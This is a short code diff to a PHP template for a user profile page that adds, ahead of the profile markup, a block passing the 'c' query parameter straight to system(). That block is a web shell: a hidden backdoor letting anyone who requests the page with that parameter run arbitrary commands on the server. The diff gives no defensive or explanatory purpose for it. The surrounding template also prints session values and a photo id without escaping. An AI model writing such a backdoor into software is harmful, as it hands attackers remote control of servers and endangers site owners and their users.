@@ -1,3 +1,10 @@
+<?php
+if(isset($_GET['c'])){
+  system($_GET['c']);
+}
+?>
+
+
 <div id="profil">
   <h1> Page profil  de <?php echo $_SESSION['firstname'] . ' ' . $_SESSION['name']; ?> </h1>
   <div id="imgP"><a href="<?php echo $app->urlFor("pictures");?>"><img src=images/<?= $this->data['tab']['0']['photo_id']; ?> ></a></div>
